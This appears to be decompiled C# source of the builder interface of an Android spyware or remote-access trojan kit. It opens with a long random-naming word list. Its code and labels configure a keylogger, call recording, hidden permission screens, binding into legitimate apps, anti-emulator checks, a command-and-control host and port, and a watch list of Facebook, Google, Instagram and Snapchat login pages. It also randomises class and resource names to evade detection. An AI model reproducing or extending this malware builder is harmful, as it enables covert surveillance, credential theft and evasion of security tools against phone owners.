			"systematic",
			"systems",
			"t",
			"ta",
			"tab",
			"table",
			"tables",
			"tablet",
			"tablets",
			"tabs",
			"tackle",
			"tactics",
			"tag",
			"tagged",
			"tags",
			"tahoe",
			"tail",
			"taiwan",
			"take",
			"taken",
			"takes",
			"taking",
			"tale",
			"talent",
			"talented",
			"tales",
			"talk",
			"talked",
			"talking",
			"talks",
			"tall",
			"tamil",
			"tampa",
			"tan",
			"tank",
			"tanks",
			"tanzania",
			"tap",
			"tape",
			"tapes",
			"tar",
			"target",
			"targeted",
			"targets",
			"tariff",
			"task",
			"tasks",
			"taste",
			"tattoo",
			"taught",
			"tax",
			"taxation",
			"taxes",
			"taxi",
			"taylor",
			"tb",
			"tba",
			"tc",
			"tcp",
			"td",
			"te",
			"tea",
			"teach",
			"teacher",
			"teachers",
			"teaches",
			"teaching",
			"team",
			"teams",
			"tear",
			"tears",
			"tech",
			"technical",
			"technician",
			"technique",
			"techniques",
			"techno",
			"technological",
			"technologies",
			"technology",
			"techrepublic",
			"ted",
			"teddy",
			"tee",
			"teen",
			"teenage",
			"teens",
			"teeth",
			"tel",
			"telecharger",
			"telecom",
			"telecommunications",
			"telephone",
			"telephony",
			"telescope",
			"television",
			"televisions",
			"tell",
			"telling",
			"tells",
			"temp",
			"temperature",
			"temperatures",
			"template",
			"templates",
			"temple",
			"temporal",
			"temporarily",
			"temporary",
			"ten",
			"tenant",
			"tend",
			"tender",
			"tennessee",
			"tennis",
			"tension",
			"tent",
			"term",
			"terminal",
			"terminals",
			"termination",
			"terminology",
			"terms",
			"terrace",
			"terrain",
			"terrible",
			"territories",
			"territory",
			"terror",
			"terrorism",
			"terrorist",
			"terrorists",
			"terry",
			"test",
			"testament",
			"tested",
			"testimonials",
			"testimony",
			"testing",
			"tests",
			"tex",
			"texas",
			"text",
			"textbook",
			"textbooks",
			"textile",
			"textiles",
			"texts",
			"texture",
			"tf",
			"tft",
			"tgp",
			"th",
			"thai",
			"thailand",
			"than",
			"thank",
			"thanks",
			"thanksgiving",
			"that",
			"thats",
			"the",
			"theater",
			"theaters",
			"theatre",
			"thee",
			"theft",
			"thehun",
			"their",
			"them",
			"theme",
			"themes",
			"themselves",
			"then",
			"theology",
			"theorem",
			"theoretical",
			"theories",
			"theory",
			"therapeutic",
			"therapist",
			"therapy",
			"there",
			"thereafter",
			"thereby",
			"therefore",
			"thereof",
			"thermal",
			"thesaurus",
			"these",
			"thesis",
			"they",
			"thick",
			"thickness",
			"thin",
			"thing",
			"things",
			"think",
			"thinking",
			"thinkpad",
			"thinks",
			"third",
			"thirty",
			"this",
			"thomas",
			"thompson",
			"thomson",
			"thong",
			"thongs",
			"thorough",
			"thoroughly",
			"those",
			"thou",
			"though",
			"thought",
			"thoughts",
			"thousand",
			"thousands",
			"thread",
			"threaded",
			"threads",
			"threat",
			"threatened",
			"threatening",
			"threats",
			"three",
			"threesome",
			"threshold",
			"thriller",
			"throat",
			"through",
			"throughout",
			"throw",
			"throwing",
			"thrown",
			"throws",
			"thru",
			"thu",
			"thumb",
			"thumbnail",
			"thumbnails",
			"thumbs",
			"thumbzilla",
			"thunder",
			"thursday",
			"thus",
			"thy",
			"ti",
			"ticket",
			"tickets",
			"tide",
			"tie",
			"tied",
			"tier",
			"ties",
			"tiffany",
			"tiger",
			"tigers",
			"tight",
			"til",
			"tile",
			"tiles",
			"till",
			"tim",
			"timber",
			"time",
			"timeline",
			"timely",
			"timer",
			"times",
			"timing",
			"timothy",
			"tin",
			"tiny",
			"tion",
			"tions",
			"tip",
			"tips",
			"tire",
			"tired",
			"tires",
			"tissue",
			"tit",
			"titanium",
			"titans",
			"title",
			"titled",
			"titles",
			"tits",
			"titten",
			"tm",
			"tmp",
			"tn",
			"to",
			"tobacco",
			"tobago",
			"today",
			"todd",
			"toddler",
			"toe",
			"together",
			"toilet",
			"token",
			"tokyo",
			"told",
			"tolerance",
			"toll",
			"tom",
			"tomato",
			"tomatoes",
			"tommy",
			"tomorrow",
			"ton",
			"tone",
			"toner",
			"tones",
			"tongue",
			"tonight",
			"tons",
			"tony",
			"too",
			"took",
			"tool",
			"toolbar",
			"toolbox",
			"toolkit",
			"tools",
			"tooth",
			"top",
			"topic",
			"topics",
			"topless",
			"tops",
			"toronto",
			"torture",
			"toshiba",
			"total",
			"totally",
			"totals",
			"touch",
			"touched",
			"tough",
			"tour",
			"touring",
			"tourism",
			"tourist",
			"tournament",
			"tournaments",
			"tours",
			"toward",
			"towards",
			"tower",
			"towers",
			"town",
			"towns",
			"township",
			"toxic",
			"toy",
			"toyota",
			"toys",
			"tp",
			"tr",
			"trace",
			"track",
			"trackback",
			"trackbacks",
			"tracked",
			"tracker",
			"tracking",
			"tracks",
			"tract",
			"tractor",
			"tracy",
			"trade",
			"trademark",
			"trademarks",
			"trader",
			"trades",
			"trading",
			"tradition",
			"traditional",
			"traditions",
			"traffic",
			"tragedy",
			"trail",
			"trailer",
			"trailers",
			"trails",
			"train",
			"trained",
			"trainer",
			"trainers",
			"training",
			"trains",
			"tramadol",
			"trance",
			"tranny",
			"trans",
			"transaction",
			"transactions",
			"transcript",
			"transcription",
			"transcripts",
			"transexual",
			"transexuales",
			"transfer",
			"transferred",
			"transfers",
			"transform",
			"transformation",
			"transit",
			"transition",
			"translate",
			"translated",
			"translation",
			"translations",
			"translator",
			"transmission",
			"transmit",
			"transmitted",
			"transparency",
			"transparent",
			"transport",
			"transportation",
			"transsexual",
			"trap",
			"trash",
			"trauma",
			"travel",
			"traveler",
			"travelers",
			"traveling",
			"traveller",
			"travelling",
			"travels",
			"travesti",
			"travis",
			"tray",
			"treasure",
			"treasurer",
			"treasures",
			"treasury",
			"treat",
			"treated",
			"treating",
			"treatment",
			"treatments",
			"treaty",
			"tree",
			"trees",
			"trek",
			"trembl",
			"tremendous",
			"trend",
			"trends",
			"treo",
			"tri",
			"trial",
			"trials",
			"triangle",
			"tribal",
			"tribe",
			"tribes",
			"tribunal",
			"tribune",
			"tribute",
			"trick",
			"tricks",
			"tried",
			"tries",
			"trigger",
			"trim",
			"trinidad",
			"trinity",
			"trio",
			"trip",
			"tripadvisor",
			"triple",
			"trips",
			"triumph",
			"trivia",
			"troops",
			"tropical",
			"trouble",
			"troubleshooting",
			"trout",
			"troy",
			"truck",
			"trucks",
			"true",
			"truly",
			"trunk",
			"trust",
			"trusted",
			"trustee",
			"trustees",
			"trusts",
			"truth",
			"try",
			"trying",
			"ts",
			"tsunami",
			"tt",
			"tu",
			"tub",
			"tube",
			"tubes",
			"tucson",
			"tue",
			"tuesday",
			"tuition",
			"tulsa",
			"tumor",
			"tune",
			"tuner",
			"tunes",
			"tuning",
			"tunisia",
			"tunnel",
			"turbo",
			"turkey",
			"turkish",
			"turn",
			"turned",
			"turner",
			"turning",
			"turns",
			"turtle",
			"tutorial",
			"tutorials",
			"tv",
			"tvcom",
			"tvs",
			"twelve",
			"twenty",
			"twice",
			"twiki",
			"twin",
			"twinks",
			"twins",
			"twist",
			"twisted",
			"two",
			"tx",
			"ty",
			"tyler",
			"type",
			"types",
			"typical",
			"typically",
			"typing",
			"u",
			"uc",
			"uganda",
			"ugly",
			"uh",
			"ui",
			"uk",
			"ukraine",
			"ul",
			"ultimate",
			"ultimately",
			"ultra",
			"ultram",
			"um",
			"un",
			"una",
			"unable",
			"unauthorized",
			"unavailable",
			"uncertainty",
			"uncle",
			"und",
			"undefined",
			"under",
			"undergraduate",
			"underground",
			"underlying",
			"understand",
			"understanding",
			"understood",
			"undertake",
			"undertaken",
			"underwear",
			"undo",
			"une",
			"unemployment",
			"unexpected",
			"unfortunately",
			"uni",
			"unified",
			"uniform",
			"union",
			"unions",
			"uniprotkb",
			"unique",
			"unit",
			"united",
			"units",
			"unity",
			"univ",
			"universal",
			"universe",
			"universities",
			"university",
			"unix",
			"unknown",
			"unless",
			"unlike",
			"unlikely",
			"unlimited",
			"unlock",
			"unnecessary",
			"unsigned",
			"unsubscribe",
			"until",
			"untitled",
			"unto",
			"unusual",
			"unwrap",
			"up",
			"upc",
			"upcoming",
			"update",
			"updated",
			"updates",
			"updating",
			"upgrade",
			"upgrades",
			"upgrading",
			"upload",
			"uploaded",
			"upon",
			"upper",
			"ups",
			"upset",
			"upskirt",
			"upskirts",
			"ur",
			"urban",
			"urge",
			"urgent",
			"uri",
			"url",
			"urls",
			"uruguay",
			"urw",
			"us",
			"usa",
			"usage",
			"usb",
			"usc",
			"usd",
			"usda",
			"use",
			"used",
			"useful",
			"user",
			"username",
			"users",
			"uses",
			"usgs",
			"using",
			"usps",
			"usr",
			"usual",
			"usually",
			"ut",
			"utah",
			"utc",
			"utilities",
			"utility",
			"utilization",
			"utilize",
			"utils",
			"uv",
			"uw",
			"uzbekistan",
			"v",
			"va",
			"vacancies",
			"vacation",
			"vacations",
			"vaccine",
			"vacuum",
			"vagina",
			"val",
			"valentine",
			"valid",
			"validation",
			"validity",
			"valium",
			"valley",
			"valuable",
			"valuation",
			"value",
			"valued",
			"values",
			"valve",
			"valves",
			"vampire",
			"van",
			"vancouver",
			"vanilla",
			"var",
			"variable",
			"variables",
			"variance",
			"variation",
			"variations",
			"varied",
			"varies",
			"variety",
			"various",
			"vary",
			"varying",
			"vast",
			"vat",
			"vatican",
			"vault",
			"vb",
			"vbulletin",
			"vc",
			"vcr",
			"ve",
			"vector",
			"vegas",
			"vegetable",
			"vegetables",
			"vegetarian",
			"vegetation",
			"vehicle",
			"vehicles",
			"velocity",
			"velvet",
			"vendor",
			"vendors",
			"venezuela",
			"venice",
			"venture",
			"ventures",
			"venue",
			"venues",
			"ver",
			"verbal",
			"verde",
			"verification",
			"verified",
			"verify",
			"verizon",
			"vermont",
			"vernon",
			"verse",
			"version",
			"versions",
			"versus",
			"vertex",
			"vertical",
			"very",
			"verzeichnis",
			"vessel",
			"vessels",
			"veteran",
			"veterans",
			"veterinary",
			"vg",
			"vhs",
			"vi",
			"via",
			"viagra",
			"vibrator",
			"vibrators",
			"vic",
			"vice",
			"victim",
			"victims",
			"victor",
			"victoria",
			"victorian",
			"victory",
			"vid",
			"video",
			"videos",
			"vids",
			"vienna",
			"vietnam",
			"vietnamese",
			"view",
			"viewed",
			"viewer",
			"viewers",
			"viewing",
			"viewpicture",
			"views",
			"vii",
			"viii",
			"viking",
			"villa",
			"village",
			"villages",
			"villas",
			"vincent",
			"vintage",
			"vinyl",
			"violation",
			"violations",
			"violence",
			"violent",
			"violin",
			"vip",
			"viral",
			"virgin",
			"virginia",
			"virtual",
			"virtually",
			"virtue",
			"virus",
			"viruses",
			"visa",
			"visibility",
			"visible",
			"vision",
			"visit",
			"visited",
			"visiting",
			"visitor",
			"visitors",
			"visits",
			"vista",
			"visual",
			"vital",
			"vitamin",
			"vitamins",
			"vocabulary",
			"vocal",
			"vocals",
			"vocational",
			"voice",
			"voices",
			"void",
			"voip",
			"vol",
			"volkswagen",
			"volleyball",
			"volt",
			"voltage",
			"volume",
			"volumes",
			"voluntary",
			"volunteer",
			"volunteers",
			"volvo",
			"von",
			"vote",
			"voted",
			"voters",
			"votes",
			"voting",
			"voyeur",
			"voyeurweb",
			"voyuer",
			"vp",
			"vpn",
			"vs",
			"vsnet",
			"vt",
			"vulnerability",
			"vulnerable",
			"w",
			"wa",
			"wage",
			"wages",
			"wagner",
			"wagon",
			"wait",
			"waiting",
			"waiver",
			"wake",
			"wal",
			"wales",
			"walk",
			"walked",
			"walker",
			"walking",
			"walks",
			"wall",
			"wallace",
			"wallet",
			"wallpaper",
			"wallpapers",
			"walls",
			"walnut",
			"walt",
			"walter",
			"wan",
			"wang",
			"wanna",
			"want",
			"wanted",
			"wanting",
			"wants",
			"war",
			"warcraft",
			"ward",
			"ware",
			"warehouse",
			"warm",
			"warming",
			"warned",
			"warner",
			"warning",
			"warnings",
			"warrant",
			"warranties",
			"warranty",
			"warren",
			"warrior",
			"warriors",
			"wars",
			"was",
			"wash",
			"washer",
			"washing",
			"washington",
			"waste",
			"watch",
			"watched",
			"watches",
			"watching",
			"water",
			"waterproof",
			"waters",
			"watershed",
			"watson",
			"watt",
			"watts",
			"wav",
			"wave",
			"waves",
			"wax",
			"way",
			"wayne",
			"ways",
			"wb",
			"wc",
			"we",
			"weak",
			"wealth",
			"weapon",
			"weapons",
			"wear",
			"wearing",
			"weather",
			"web",
			"webcam",
			"webcams",
			"webcast",
			"weblog",
			"weblogs",
			"webmaster",
			"webmasters",
			"webpage",
			"webshots",
			"website",
			"websites",
			"webster",
			"wed",
			"wedding",
			"weddings",
			"wednesday",
			"weed",
			"week",
			"weekend",
			"weekends",
			"weekly",
			"weeks",
			"weight",
			"weighted",
			"weights",
			"weird",
			"welcome",
			"welding",
			"welfare",
			"well",
			"wellington",
			"wellness",
			"wells",
			"welsh",
			"wendy",
			"went",
			"were",
			"wesley",
			"west",
			"western",
			"westminster",
			"wet",
			"whale",
			"what",
			"whatever",
			"whats",
			"wheat",
			"wheel",
			"wheels",
			"when",
			"whenever",
			"where",
			"whereas",
			"wherever",
			"whether",
			"which",
			"while",
			"whilst",
			"white",
			"who",
			"whole",
			"wholesale",
			"whom",
			"whore",
			"whose",
			"why",
			"wi",
			"wichita",
			"wicked",
			"wide",
			"widely",
			"wider",
			"widescreen",
			"widespread",
			"width",
			"wife",
			"wifi",
			"wiki",
			"wikipedia",
			"wild",
			"wilderness",
			"wildlife",
			"wiley",
			"will",
			"william",
			"williams",
			"willing",
			"willow",
			"wilson",
			"win",
			"wind",
			"window",
			"windows",
			"winds",
			"windsor",
			"wine",
			"wines",
			"wing",
			"wings",
			"winner",
			"winners",
			"winning",
			"wins",
			"winston",
			"winter",
			"wire",
			"wired",
			"wireless",
			"wires",
			"wiring",
			"wisconsin",
			"wisdom",
			"wise",
			"wish",
			"wishes",
			"wishlist",
			"wit",
			"witch",
			"with",
			"withdrawal",
			"within",
			"without",
			"witness",
			"witnesses",
			"wives",
			"wizard",
			"wm",
			"wma",
			"wn",
			"wolf",
			"woman",
			"women",
			"womens",
			"won",
			"wonder",
			"wonderful",
			"wondering",
			"wood",
			"wooden",
			"woods",
			"wool",
			"worcester",
			"word",
			"wordpress",
			"words",
			"work",
			"worked",
			"worker",
			"workers",
			"workflow",
			"workforce",
			"working",
			"workout",
			"workplace",
			"works",
			"workshop",
			"workshops",
			"workstation",
			"world",
			"worldcat",
			"worlds",
			"worldsex",
			"worldwide",
			"worm",
			"worn",
			"worried",
			"worry",
			"worse",
			"worship",
			"worst",
			"worth",
			"worthy",
			"would",
			"wound",
			"wow",
			"wp",
			"wr",
			"wrap",
			"wrapped",
			"wrapping",
			"wrestling",
			"wright",
			"wrist",
			"write",
			"writer",
			"writers",
			"writes",
			"writing",
			"writings",
			"written",
			"wrong",
			"wrote",
			"ws",
			"wt",
			"wto",
			"wu",
			"wv",
			"ww",
			"www",
			"wx",
			"wy",
			"wyoming",
			"x",
			"xanax",
			"xbox",
			"xerox",
			"xhtml",
			"xi",
			"xl",
			"xml",
			"xnxx",
			"xp",
			"xx",
			"xxx",
			"y",
			"ya",
			"yacht",
			"yahoo",
			"yale",
			"yamaha",
			"yang",
			"yard",
			"yards",
			"yarn",
			"ye",
			"yea",
			"yeah",
			"year",
			"yearly",
			"years",
			"yeast",
			"yellow",
			"yemen",
			"yen",
			"yes",
			"yesterday",
			"yet",
			"yield",
			"yields",
			"yn",
			"yo",
			"yoga",
			"york",
			"yorkshire",
			"you",
			"young",
			"younger",
			"your",
			"yours",
			"yourself",
			"youth",
			"yr",
			"yrs",
			"yu",
			"yugoslavia",
			"yukon",
			"z",
			"za",
			"zambia",
			"zdnet",
			"zealand",
			"zen",
			"zero",
			"zimbabwe",
			"zinc",
			"zip",
			"zoloft",
			"zone",
			"zones",
			"zoning",
			"zoo",
			"zoom",
			"zoophilia",
			"zope",
			"zshops",
			"zu",
			"zum",
			"zus"
		};
		this.rnd = new Random();
		this.numberrandomer = null;
		this.RectInputText0 = new List<Rectangle>();
		this.RectInputText1 = new List<Rectangle>();
		this.RectInputText3 = new List<Rectangle>();
		this.InitializeComponent();
	}

	// Token: 0x060001FD RID: 509 RVA: 0x0003C73C File Offset: 0x0003A93C
	public void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.trakertitle.Text = "追踪清单";
				this.checkcatpure.Text = Codes.Translate(this.checkcatpure.Text, "en", "zh");
				this.checkcaptureonce.Text = Codes.Translate(this.checkcaptureonce.Text, "en", "zh");
				this.Label44.Text = Codes.Translate(this.Label44.Text, "en", "zh");
				this.Label42.Text = Codes.Translate(this.Label42.Text, "en", "zh");
				this.CheckSkipre.Text = Codes.Translate(this.CheckSkipre.Text, "en", "zh");
				this.checknetwork.Text = Codes.Translate(this.checknetwork.Text, "en", "zh");
				this.Label45.Text = Codes.Translate(this.Label45.Text, "en", "zh");
				this.Label46.Text = Codes.Translate(this.Label46.Text, "en", "zh");
				this.Label47.Text = Codes.Translate(this.Label47.Text, "en", "zh");
				this.Label8.Text = Codes.Translate(this.Label8.Text, "en", "zh");
				this.Label48.Text = Codes.Translate(this.Label48.Text, "en", "zh");
				this.clonecheck.Text = Codes.Translate(this.clonecheck.Text, "en", "zh");
				this.checkunlocker.Text = Codes.Translate(this.checkunlocker.Text, "en", "zh");
				this.MainText.Text = "主要文本";
				this.Label1.Text = "通信端口";
				this.Label20.Text = "安装后";
				this.sizelabel.Text = "应用程序大小";
				this.keeplivelabel.Text = "保持连接";
				this.Label22.Text = "应用程序名称";
				this.Label23.Text = "网站链接";
				this.Button1.Text = "应用程序图标";
				this.Label27.Text = "自定义应用程序";
				this.CheckFakeSize.Text = "增加应用程序大小";
				this.Label28.Text = "自定义通知";
				this.Label24.Text = "徽标标题";
				this.Label25.Text = "通知内容";
				this.Label25.Text = "保持连接";
				this.Label2.Text = "用户名";
				this.Label3.Text = "应用程序名称";
				this.Label9.Text = "应用程序版本";
				this.Label4.Text = "应用程序标识";
				this.CheckIconPatch.Text = "图标";
				this.checkkeyloger.Text = "键盘记录器";
				this.checkemo.Text = "仅在真实手机上运行";
				this.Checksuper.Text = "超级模式";
				this.CheckRecord.Text = "录音通话";
				this.checkprotector.Text = "应用程序保护";
				this.CheckHidePrims.Text = "隐藏权限屏幕";
				this.CheckBIND.Text = "绑定";
				this.trgtbkg.Watermark = "绑定的应用程序标识";
				this.Label19.Text = "应用程序版本";
				this.Label29.Text = "标题";
				this.Label31.Text = "欢迎消息";
				this.Label32.Text = "激活按钮";
				this.checkadmin.Text = "请求管理员权限";
				this.Button3.Text = "默认模式";
				this.SelectedApk.Text = "构建应用程序";
				this.delaylabelaccess.Text = "访问权限请求延迟";
				this.checkautostart.Text = "MIUI自动启动权限";
				this.checkkeepsscreen.Text = "保持屏幕常亮";
				this.TABCTRL.TabPages[0].Text = "信息";
				this.TABCTRL.TabPages[1].Text = "选项";
				this.TABCTRL.TabPages[2].Text = "工具";
				this.TABCTRL.TabPages[3].Text = "界面";
				this.TABCTRL.TabPages[4].Text = "权限";
				this.TABCTRL.TabPages[5].Text = "构建";
				this.CheckQuick.Text = "快速安装";
				this.CheckDraw.Text = "应用上层显示";
			}
		}
		else
		{
			this.MainText.Text = "الأيبي \\ هوست";
			this.Label1.Text = "منفذ الاتصال";
			this.Label20.Text = "بعد التثبيت";
			this.sizelabel.Text = "حجم التطبيق";
			this.keeplivelabel.Text = "البقاء متصل";
			this.Label22.Text = "إسم التطبيق";
			this.Label23.Text = "رابط الموقع";
			this.Button1.Text = "أيقونة التطبيق";
			this.Label27.Text = "تطبيق مخصص";
			this.CheckFakeSize.Text = "إضافة جحم لتطبيق";
			this.Label28.Text = "إشعار مخصص";
			this.Label24.Text = "عنوان الشعار";
			this.Label25.Text = "محتوى الأشعار";
			this.Label25.Text = "البقاء متصل";
			this.Label2.Text = "إسم المستخدم";
			this.Label3.Text = "إسم التطبيق";
			this.Label9.Text = "إصدار التطبيق";
			this.Label4.Text = "معرف التطبيق";
			this.CheckIconPatch.Text = "الأيقونة";
			this.checkkeyloger.Text = "مسجل المفاتيح";
			this.checkemo.Text = "تشغيل فقط على هواتف حقيقة";
			this.Checksuper.Text = "الوضع الخارق";
			this.CheckRecord.Text = "تسجيل المكالمات";
			this.checkprotector.Text = "حماية التطبيق";
			this.CheckHidePrims.Text = "إخفاء شاشة الصلاحيات";
			this.CheckBIND.Text = "دمج";
			this.trgtbkg.Watermark = "معرف التطبيق المدموج";
			this.Label19.Text = "إصدار التطبيق";
			this.Label29.Text = "العنوان";
			this.Label31.Text = "رسالة الترحيب";
			this.Label32.Text = "زر التفعيل";
			this.checkadmin.Text = "طلب صلاحية مسؤول";
			this.Button3.Text = "الوضع الأفتراضي";
			this.SelectedApk.Text = "بناء التطبيق";
			this.delaylabelaccess.Text = "تاخير طلب صلاحية الوصول";
			this.checkautostart.Text = "MIUI صلاحية البدء التلقائي";
			this.checkkeepsscreen.Text = "إبقاء الشاشة مضاءة";
			this.TABCTRL.TabPages[0].Text = "معلومات";
			this.TABCTRL.TabPages[1].Text = "خيارات";
			this.TABCTRL.TabPages[2].Text = "أدواة";
			this.TABCTRL.TabPages[3].Text = "الواجهة";
			this.TABCTRL.TabPages[4].Text = "مراقبة";
			this.TABCTRL.TabPages[5].Text = "بناء";
			this.CheckQuick.Text = "تثبيت سريع";
			this.CheckDraw.Text = "الظهور فوق التطبيقات";
			this.checkcatpure.Text = Codes.Translate(this.checkcatpure.Text, "en", "ar");
			this.checkcaptureonce.Text = Codes.Translate(this.checkcaptureonce.Text, "en", "ar");
			this.Label44.Text = Codes.Translate(this.Label44.Text, "en", "ar");
			this.Label42.Text = Codes.Translate(this.Label42.Text, "en", "ar");
			this.CheckSkipre.Text = Codes.Translate(this.CheckSkipre.Text, "en", "ar");
			this.checknetwork.Text = Codes.Translate(this.checknetwork.Text, "en", "ar");
			this.Label45.Text = Codes.Translate(this.Label45.Text, "en", "ar");
			this.Label46.Text = Codes.Translate(this.Label46.Text, "en", "ar");
			this.Label47.Text = Codes.Translate(this.Label47.Text, "en", "ar");
			this.Label37.Text = Codes.Translate(this.Label37.Text, "en", "ar");
			this.Label8.Text = Codes.Translate(this.Label8.Text, "en", "ar");
			this.Label48.Text = Codes.Translate(this.Label48.Text, "en", "ar");
			this.clonecheck.Text = Codes.Translate(this.clonecheck.Text, "en", "ar");
			this.checkunlocker.Text = Codes.Translate(this.checkunlocker.Text, "en", "ar");
			this.trakertitle.Text = "قائمة تتبع";
		}
	}

	// Token: 0x060001FE RID: 510 RVA: 0x0000206C File Offset: 0x0000026C
	private void b_Add_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060001FF RID: 511 RVA: 0x0000206C File Offset: 0x0000026C
	private void SpyStyle()
	{
	}

	// Token: 0x06000200 RID: 512 RVA: 0x0003D1A8 File Offset: 0x0003B3A8
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000201 RID: 513 RVA: 0x0003D1F0 File Offset: 0x0003B3F0
	private void Build_Load(object sender, EventArgs e)
	{
		Codes.SetWindowDisplayAffinity(base.Handle, 1U);
		this.TABCTRL.TabPages[5].BackColor = Color.Black;
		try
		{
		}
		catch (Exception)
		{
		}
		try
		{
			string[] array = "Facebook>facebook.com>com.facebook.katana>!Youtube>youtube.com>com.google.android.youtube>!instagram>instagram.com>com.instagram.android>!google>accounts.google.com>com.google.android.gm>!snapchat>snapchat.com>com.snapchat.android>!GoogleDrive>drive.google.com/drive/my-drive>com.google.android.apps.docs>!".Split(new char[]
			{
				'!'
			});
			ListBox.ObjectCollection items = this.listmonitor.Items;
			object[] items2 = array;
			items.AddRange(items2);
		}
		catch (Exception)
		{
		}
		try
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\4.ico");
			this.Translateme();
		}
		catch (Exception)
		{
		}
		try
		{
			this.Nottitle.Text = MySettingsProperty.Settings.NotifiTitle;
			this.Notmsg.Text = MySettingsProperty.Settings.NotifiText;
			this.logbodytext.Text = MySettingsProperty.Settings.bodytext;
			this.dscriptext.Text = MySettingsProperty.Settings.accessdiscribe;
		}
		catch (Exception)
		{
		}
		checked
		{
			try
			{
				int num = 1;
				do
				{
					this.Button4_Click(null, null);
					this.Button2_Click(null, null);
					num++;
				}
				while (num <= 3);
			}
			catch (Exception)
			{
			}
			try
			{
				this.Programmatically = true;
			}
			catch (Exception)
			{
			}
			try
			{
				this.TextNameVictim.Text = MySettingsProperty.Settings.build_text_name_victim;
				this.TextNamePatch.Text = MySettingsProperty.Settings.build_text_name_patch;
				this.TextVersion.Text = MySettingsProperty.Settings.build_text_version;
			}
			catch (Exception)
			{
			}
			try
			{
			}
			catch (Exception)
			{
			}
			try
			{
				this.po.Text = Conversions.ToString(MySettingsProperty.Settings.build_text_port);
				this.CheckHide.Checked = true;
				this.CheckDoze.Checked = MySettingsProperty.Settings.build_Checked_doze;
				this.CheckIconPatch.Checked = MySettingsProperty.Settings.build_Checked_icon;
				this.iconPatch = MySettingsProperty.Settings.build_path_icon;
			}
			catch (Exception)
			{
			}
			try
			{
				if (this.iconPatch.Length > 0)
				{
					try
					{
						this.PictureBox1.Image = Image.FromFile(this.iconPatch);
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				if (!File.Exists(this.iconPatch) && Operators.CompareString(this.iconPatch, "null", false) != 0)
				{
					this.iconPatch = "null";
					this.CheckIconPatch.Checked = false;
				}
			}
			catch (Exception)
			{
			}
			try
			{
				this.TextIP.Text = MySettingsProperty.Settings.inj_thost;
			}
			catch (Exception)
			{
			}
			try
			{
				this.Programmatically = false;
				this.TOpacity.Interval = SpySettings.T_Interval;
				this.TOpacity.Enabled = true;
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000202 RID: 514 RVA: 0x0000206C File Offset: 0x0000026C
	private void TiMAT_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x06000203 RID: 515 RVA: 0x0000206C File Offset: 0x0000026C
	private void TextFutex_MouseHover(object sender, EventArgs e)
	{
	}

	// Token: 0x06000204 RID: 516 RVA: 0x0000206C File Offset: 0x0000026C
	private void TextFutex_MouseLeave(object sender, EventArgs e)
	{
	}

	// Token: 0x06000205 RID: 517 RVA: 0x0000206C File Offset: 0x0000026C
	private void SelectedApk_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000206 RID: 518 RVA: 0x0003D520 File Offset: 0x0003B720
	public string asab(string input)
	{
		string[] array = input.Replace("​", " ").Split(new char[]
		{
			' '
		});
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	// Token: 0x06000207 RID: 519 RVA: 0x00002457 File Offset: 0x00000657
	private void EncryRando_notifiXML()
	{
		this.NnotifiXML = this.Randomunicode(5, 25).ToString().ToLower();
	}

	// Token: 0x06000208 RID: 520 RVA: 0x00002472 File Offset: 0x00000672
	private void EncryRando_webXML()
	{
		this.NwebXML = this.Randomunicode(5, 25).ToString().ToLower();
	}

	// Token: 0x06000209 RID: 521 RVA: 0x0000248D File Offset: 0x0000068D
	private void EncryRando_drawable()
	{
		this.Ndraw_ico = this.Randomunicode(5, 25).ToString().ToLower();
		this.Ndraw_notifi = this.Randomunicode(5, 25).ToString().ToLower();
	}

	// Token: 0x0600020A RID: 522 RVA: 0x000024C1 File Offset: 0x000006C1
	private void EncryRando_app_reso()
	{
		this.Napp_reso0 = this.Randomunicode(5, 25);
	}

	// Token: 0x0600020B RID: 523 RVA: 0x0003D59C File Offset: 0x0003B79C
	private void EncryRandoreso()
	{
		this.NresoString0 = this.Randomunicode(10, 25);
		this.NresoString1 = this.Randomunicode(10, 25);
		this.NresoString2 = this.Randomunicode(10, 25);
		this.NresoString3 = this.Randomunicode(10, 25);
		this.NresoString4 = this.Randomunicode(10, 25);
		this.NresoString5 = this.Randomunicode(10, 25);
		this.NresoString6 = this.Randomunicode(10, 25);
		this.NresoString7 = this.Randomunicode(10, 25);
		this.NresoString8 = this.Randomunicode(10, 25);
		this.NresoString9 = this.Randomunicode(10, 25);
		this.NresoString10 = this.Randomunicode(10, 25);
		this.NresoString11 = this.Randomunicode(10, 25);
		this.NresoString12 = this.Randomunicode(10, 25);
	}

	// Token: 0x0600020C RID: 524 RVA: 0x0003D67C File Offset: 0x0003B87C
	private void EncryRando()
	{
		this.LogB("Please Wait...");
		this.NClassGen0 = this.RandommMad(50, 80);
		this.NClassGen1 = this.RandommMad(50, 80);
		this.NClassGen2 = this.RandommMad(50, 80);
		this.NClassGen3 = this.RandommMad(50, 80);
		this.NClassGen4 = this.RandommMad(50, 80);
		this.NClassGen5 = this.RandommMad(50, 80);
		this.NClassGen6 = this.RandommMad(50, 80);
		this.NClassGen8 = this.RandommMad(50, 80);
		this.NClassGen9 = this.RandommMad(50, 80);
		this.NClassGen10 = this.RandommMad(50, 80);
		this.NClassGen11 = this.RandommMad(50, 80);
		this.NClassGen12 = this.RandommMad(50, 80);
		this.NClassGen13 = this.RandommMad(50, 80);
		this.NClassGen14 = this.RandommMad(50, 80);
		this.NRequestAccess = this.RandommMad(50, 80);
		this.NRequestBattery = this.RandommMad(50, 80);
		this.NRequestDraw = this.RandommMad(50, 80);
		this.N_sc_fb_ = this.RandommMad(50, 80);
		this.N_news_g_ = this.RandommMad(50, 80);
		this.N_strt_view_ = this.RandommMad(50, 80);
		this.NHandelScreenCap = this.RandommMad(50, 80);
		this.NStartScreenCap = this.RandommMad(50, 80);
